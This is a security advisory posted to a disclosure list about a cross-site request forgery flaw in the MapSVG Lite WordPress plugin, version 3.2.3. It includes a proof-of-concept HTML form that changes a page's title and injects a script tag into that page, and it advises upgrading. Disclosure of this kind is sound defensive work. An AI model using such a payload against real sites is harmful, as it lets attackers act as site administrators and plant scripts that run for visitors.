Subject: [FD] CSRF in MapSVG Lite could allow an attacker to do almost
	anything an admin can (WordPress plugin)

Details
================
Software: MapSVG Lite
Version: 3.2.3
Homepage: https://en-gb.wordpress.org/plugins/mapsvg-lite-interactive-vector-maps/
Advisory report: https://advisories.dxw.com/advisories/csrf-mapsvg-lite/
CVE: Awaiting assignment
CVSS: 5.8 (Medium; AV:N/AC:M/Au:N/C:P/I:P/A:N)

Description
================
CSRF in MapSVG Lite could allow an attacker to do almost anything an admin can

Vulnerability
================
The plugin uses REST requests to modify post data, and does not check the nonce when doing so.

Proof of concept
================

Install the plugin on a site at http://localhost/
Ensure you have page with ID of 2.
Whilst logged in, visit an html page with this content and submit the form:

<form method=\"POST\" action=\"http://localhost/wp-admin/admin-ajax.php?action=mapsvg_save\">
 <input type=\"text\" name=\"data[title]\" value=\"A bad value\">
 <input type=\"text\" name=\"data[mapsvg_data]\" value=\"<script>alert(\'hello\')</script>\">
 <input type=\"text\" name=\"data[map_id]\" value=\"2\">
 <input type=\"submit\">
</form>


Visit the page with ID of 2. It now has title of “A bad value” and alerts “hello” on loading.


Mitigations
================
Upgrade to version 3.3.0 or above.
